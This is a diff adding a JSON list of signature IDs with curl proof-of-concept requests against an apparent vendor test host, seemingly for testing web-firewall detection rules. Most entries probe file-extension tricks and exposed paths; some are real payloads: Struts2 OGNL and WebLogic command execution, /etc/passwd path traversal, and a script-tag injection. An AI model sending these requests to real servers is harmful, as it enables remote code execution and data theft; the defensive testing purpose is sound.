@@ -1,0 +1,254 @@
+[
+  {
+    "sig_id": "120100001",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.asp%23\""
+  },
+  {
+    "sig_id": "120100002",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.asa%23\""
+  },
+  {
+    "sig_id": "120100003",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.cdx%23\""
+  },
+  {
+    "sig_id": "120100004",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.cer%23\""
+  },
+  {
+    "sig_id": "120100005",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.asp/\""
+  },
+  {
+    "sig_id": "120100006",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.asa/\""
+  },
+  {
+    "sig_id": "120100007",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.cdx/\""
+  },
+  {
+    "sig_id": "120100008",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.cer/\""
+  },
+  {
+    "sig_id": "120100009",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.php..\""
+  },
+  {
+    "sig_id": "120100010",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.cgi.\""
+  },
+  {
+    "sig_id": "120100011",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.inc.\""
+  },
+  {
+    "sig_id": "120100012",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.shtml.\""
+  },
+  {
+    "sig_id": "120100013",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.shtm.\""
+  },
+  {
+    "sig_id": "120100014",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.html.\""
+  },
+  {
+    "sig_id": "120100015",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.htm.\""
+  },
+  {
+    "sig_id": "120100016",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.%25c0%25af\""
+  },
+  {
+    "sig_id": "120100017",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/*.jsp\""
+  },
+  {
+    "sig_id": "120100018",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/%3F.jsp\""
+  },
+  {
+    "sig_id": "120100019",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x::$data\""
+  },
+  {
+    "sig_id": "120100020",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x.php;\""
+  },
+  {
+    "sig_id": "120100021",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/x;.jsp\""
+  },
+  {
+    "sig_id": "120100022",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/;target.do\""
+  },
+  {
+    "sig_id": "120100023",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/editor/filemanager/\""
+  },
+  {
+    "sig_id": "120100024",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xecuredemo/\""
+  },
+  {
+    "sig_id": "120100025",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/psa.a\""
+  },
+  {
+    "sig_id": "120100026",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xpsa.a\""
+  },
+  {
+    "sig_id": "120100027",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/asa.a\""
+  },
+  {
+    "sig_id": "120100028",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xdc.a\""
+  },
+  {
+    "sig_id": "120100029",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/rec.a\""
+  },
+  {
+    "sig_id": "120100030",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xmsa.a\""
+  },
+  {
+    "sig_id": "120100031",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xhsa.a\""
+  },
+  {
+    "sig_id": "120100032",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/dxa.a\""
+  },
+  {
+    "sig_id": "120100033",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/xasa.a\""
+  },
+  {
+    "sig_id": "120100034",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/da.a\""
+  },
+  {
+    "sig_id": "120100035",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/_sample/\""
+  },
+  {
+    "sig_id": "120100036",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/tinymce/examples/\""
+  },
+  {
+    "sig_id": "120100037",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/assetmanager/\""
+  },
+  {
+    "sig_id": "120100038",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/initech/demo/\""
+  },
+  {
+    "sig_id": "120100039",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/tb.php/\""
+  },
+  {
+    "sig_id": "120100040",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/phpthumb/phpThumb.php\""
+  },
+  {
+    "sig_id": "120100041",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/manager/html/manager/deploy\""
+  },
+  {
+    "sig_id": "120100042",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/.git\""
+  },
+  {
+    "sig_id": "120100043",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/wls-wsat/CoordinatorPortType\""
+  },
+  {
+    "sig_id": "120100044",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/struts2-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27calc%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23jas502n%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23jas502n.println(%23d+)%2c%23jas502n.close())%7d/actionChain1.action\""
+  },
+  {
+    "sig_id": "120100045",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/bbs/wp-config.php.swp\""
+  },
+  {
+    "sig_id": "120100046",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/..;/etc/passwd \""
+  },
+  {
+    "sig_id": "120100047",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/backup_db.7z\""
+  },
+  {
+    "sig_id": "120100048",
+    "poc_example": "curl http://www.vulnerability.piolink.com/html/newapp.sublime-project"
+  },
+  {
+    "sig_id": "120100049",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/v1/buckets/default/ext-5dkJ19tFufpMZjVJbsWCiqDcclDw/records\""
+  },
+  {
+    "sig_id": "120100050",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/vi-assets/static-assets\""
+  },
+  {
+    "sig_id": "120100051",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/tangstatic/js/main-q1a2z3b37df2b1.min.js\""
+  },
+  {
+    "sig_id": "120100052",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/api2/json/cluster/resources\""
+  },
+  {
+    "sig_id": "120100053",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/en-us/store/api/checkproductinwishlist\""
+  },
+  {
+    "sig_id": "120100054",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/1.5/95648064/storage/history\""
+  },
+  {
+    "sig_id": "120100055",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/global-q1a2z3C4M2nNlQYzWhCC0oMSEFjQbW1KA.min.json\""
+  },
+  {
+    "sig_id": "120100056",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/1.5/95648064/storage/tabs\""
+  },
+  {
+    "sig_id": "120100057",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/v3/links/ping-centre\""
+  },
+  {
+    "sig_id": "120100058",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)\""
+  },
+  {
+    "sig_id": "120100059",
+    "poc_example": "curl \"http://www.vulnerability.piolink.com/wls-wsat/CoordinatorPortType\""
+  },
+  {
+    "sig_id": "120100060",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/public/\"><script>alert(123)</script>/folder/\""
+  },
+  {
+    "sig_id": "120100061",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/;/admin\""
+  },
+  {
+    "sig_id": "120100062",
+    "poc_example": "curl --path-as-is \"https://www.vulnerability.piolink.com/%20/\""
+  },
+  {
+    "sig_id": "120100063",
+    "poc_example": "curl \"https://www.vulnerability.piolink.com/cgi-bin/%%32%65%%32%65/etc/passwd\""
+  }
+]
